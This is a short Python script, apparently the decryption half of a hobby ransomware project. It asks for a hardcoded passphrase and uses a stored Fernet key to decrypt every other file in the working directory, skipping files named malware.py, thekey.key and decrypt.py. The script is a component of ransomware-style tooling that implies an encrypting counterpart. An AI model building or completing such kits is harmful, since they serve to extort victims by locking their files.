#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
	if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print("Encrypted files", files)

with open("thekey.key", "rb") as key:
        secretKey = key.read()
passphrase = "Sarandi"
upassword  = input("Enter the password to decrypt your files:")
if upassword == passphrase:
        for file in files:
                    with open(file, "rb") as thefile:
                            content = thefile.read()
                    content_decrypt = Fernet(secretKey).decrypt(content)
                    with open(file,"wb") as thefile:
                            thefile.write(content_decrypt)
                    print("your Recovered all your files")
else :
            print("enter the right password to recovery your files")
